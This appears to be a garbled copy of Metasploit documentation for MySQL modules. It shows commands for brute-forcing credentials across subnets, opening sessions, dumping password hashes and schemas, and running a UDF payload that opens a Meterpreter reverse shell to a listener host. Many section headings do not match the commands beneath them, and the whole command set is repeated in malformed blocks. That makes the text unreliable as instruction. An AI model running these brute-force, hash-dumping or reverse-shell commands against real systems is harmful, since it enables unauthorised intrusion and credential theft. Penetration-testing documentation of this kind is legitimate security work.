## MySQL
There are more modules than listed here, for the full list of modules run the `search` command within msfconsole:
```msf
msf6 > search mysql
```

Or to search for modules that work with a specific session type:
```msf
msf6 > search session_type:mysql
```

### Lab Environment
When testing in a lab environment MySQL can either be installed on the host machine or within Docker:
```
use auxiliary/scanner/mysql/mysql_version
run mysql://127.0.0.1
```

### MySQL Enumeration
Enumerate version:
```
use auxiliary/scanner/mysql/mysql_login
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

### MySQL Login / Bruteforce
If you have MySQL credentials to validate:
```
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
```

Re-using MySQL credentials in a subnet:
```
use auxiliary/scanner/mysql/mysql_login
run mysql://user:pass@192.168.123.6:2222
```

Using an alternative port:
```
use auxiliary/scanner/mysql/mysql_login
run mysql://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
```

Brute-force host with known user and password list:
```
use auxiliary/scanner/mysql/mysql_login
run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
```

Brute-force credentials:
```
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
```

Brute-force credentials in a subnet:
```msf
msf6 > use scanner/mysql/mysql_login 
msf6 auxiliary(scanner/mysql/mysql_login) > run rhost=127.0.0.1 rport=4306 username=root password=password createsession=true

[+] 127.0.0.1:4306        - 127.0.0.1:4306 - Found remote MySQL version 11.2.2
[+] 127.0.0.1:4306        - 127.0.0.1:4306 - Success: 'root:password'
[*] MySQL session 1 opened (127.0.0.1:53241 -> 127.0.0.1:4306) at 2024-03-12 12:40:46 -0500
[*] 127.0.0.1:4306        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_login) > sessions -i -1
[*] Starting interaction with 1...

mysql @ 127.0.0.1:4306 >
```

### Obtaining an Interactive Session on the Target
set to true should give you an interactive session:
```msf
msf6 auxiliary(scanner/mysql/mysql_login) > sessions

Active sessions
===============

  Id  Name  Type   Information                      Connection
  --  ----  ----   -----------                      ----------
  2         mssql  MSSQL test @ 192.168.2.242:1433  192.168.2.1:61428 -> 192.168.2.242:1433 (192.168.2.242)
  3         mysql  MySQL root @ 127.0.0.1:4306      127.0.0.1:61450 -> 127.0.0.1:4306 (127.0.0.1)

msf6 auxiliary(scanner/mysql/mysql_login) > sessions -i 3
[*] Starting interaction with 3...
```

You can also use `help` to get more information about how to use your session.
```
use auxiliary/scanner/mysql/mysql_hashdump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

When interacting with a session, the help command can be useful:
```
use auxiliary/scanner/mysql/mysql_schemadump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
```

Once you've done that, you can run any MySQL query against the target using the `query` command:
```
use admin/mysql/mysql_sql
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' sql='select version()'
```

Alternatively you can enter a SQL prompt via the `query_interactive` command which supports multiline commands:
```
use multi/mysql/mysql_udf_payload
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' lhost=192.168.123.1 target=Linux payload=linux/x86/meterpreter/reverse_tcp
```

`msf
msf6 > search mysql
`

`msf
msf6 > search session_type:mysql
`

`
use auxiliary/scanner/mysql/mysql_version
run mysql://127.0.0.1
`

`
use auxiliary/scanner/mysql/mysql_login
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
`

`
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
`

`
use auxiliary/scanner/mysql/mysql_login
run mysql://user:pass@192.168.123.6:2222
`

`
use auxiliary/scanner/mysql/mysql_login
run mysql://known_user@192.168.222.1 threads=50 pass_file=./wordlist.txt
`

`
use auxiliary/scanner/mysql/mysql_login
run mysql://192.168.222.1 threads=50 user_file=./users.txt pass_file=./wordlist.txt
`

`
use auxiliary/scanner/mysql/mysql_login
run cidr:/24:mysql://user:pass@192.168.222.0 threads=50
run cidr:/24:mysql://user@192.168.222.0 threads=50 pass_file=./wordlist.txt
`

`msf
msf6 > use scanner/mysql/mysql_login 
msf6 auxiliary(scanner/mysql/mysql_login) > run rhost=127.0.0.1 rport=4306 username=root password=password createsession=true

[+] 127.0.0.1:4306        - 127.0.0.1:4306 - Found remote MySQL version 11.2.2
[+] 127.0.0.1:4306        - 127.0.0.1:4306 - Success: 'root:password'
[*] MySQL session 1 opened (127.0.0.1:53241 -> 127.0.0.1:4306) at 2024-03-12 12:40:46 -0500
[*] 127.0.0.1:4306        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_login) > sessions -i -1
[*] Starting interaction with 1...

mysql @ 127.0.0.1:4306 >
`

`msf
msf6 auxiliary(scanner/mysql/mysql_login) > sessions

Active sessions
===============

  Id  Name  Type   Information                      Connection
  --  ----  ----   -----------                      ----------
  2         mssql  MSSQL test @ 192.168.2.242:1433  192.168.2.1:61428 -> 192.168.2.242:1433 (192.168.2.242)
  3         mysql  MySQL root @ 127.0.0.1:4306      127.0.0.1:61450 -> 127.0.0.1:4306 (127.0.0.1)

msf6 auxiliary(scanner/mysql/mysql_login) > sessions -i 3
[*] Starting interaction with 3...
`

`
use auxiliary/scanner/mysql/mysql_hashdump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
`

`
use auxiliary/scanner/mysql/mysql_schemadump
run 'mysql://root: a b c p4$$w0rd@127.0.0.1'
`

`
use admin/mysql/mysql_sql
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' sql='select version()'
`

`
use multi/mysql/mysql_udf_payload
run 'mysql://root: a b c p4$$w0rd@127.0.0.1' lhost=192.168.123.1 target=Linux payload=linux/x86/meterpreter/reverse_tcp
`

